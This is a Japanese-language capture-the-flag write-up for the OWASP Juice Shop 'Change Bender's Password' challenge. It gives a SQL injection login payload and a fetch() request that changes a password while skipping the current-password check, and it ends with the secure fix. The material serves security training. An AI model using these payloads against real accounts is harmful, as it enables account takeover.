# Change Bender's Password ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** 認証
**目標:** 現在のパスワードを知らずにパスワードを変更する

---

## 思考プロセス

**ステップ1: パスワード変更フローを分析**
```
「通常のパスワード変更には現在のパスワードが必要」
    ↓
「フォームには current, new, repeat の3つのフィールド」
    ↓
「APIにも同じパラメータが送られるはず」
    ↓
「もし current を省略したら？」
```

**ステップ2: パラメータ省略を試す**
```
「Network タブでリクエストを観察」
    ↓
「GET /rest/user/change-password?current=xxx&new=yyy&repeat=yyy」
    ↓
「current を削除してリクエストを送信してみる」
    ↓
「パスワードが変更された！」
```

**ステップ3: 脆弱性の原因を推測**
```
「サーバー側のコードを推測：」
    ↓
「if (current && currentPassword !== user.password) { エラー }」
    ↓
「current が undefined だと条件式全体が false になる」
    ↓
「検証がスキップされてパスワードが変更される」
```

## 実行手順

1. まず Bender としてログイン（SQLi: `bender@juice-sh.op'--`）
2. ブラウザのアドレスバーに直接入力、または Console で:
   ```javascript
   fetch('/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic', {
     headers: {
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     }
   })
   ```
3. パスワードが変更される

## 解説

**脆弱なコードパターン:**
```javascript
// 脆弱な実装
if (current && currentPassword !== user.password) {
  return error;
}
// current が undefined だと、この if 文全体が false になる

// 安全な実装
if (!current || currentPassword !== user.password) {
  return error;
}
```

**なぜ危険？**
- セッションを盗めば（XSSなど）、パスワードを変更可能
- 現在のパスワードを知らなくてもアカウント乗っ取り可能
- フロントエンドの検証に頼った脆弱な実装

## 関連チャレンジ

- [Login Bender](../difficulty-3/login-bender.md)
- [Reset Bender's Password](../difficulty-4/reset-benders-password.md)
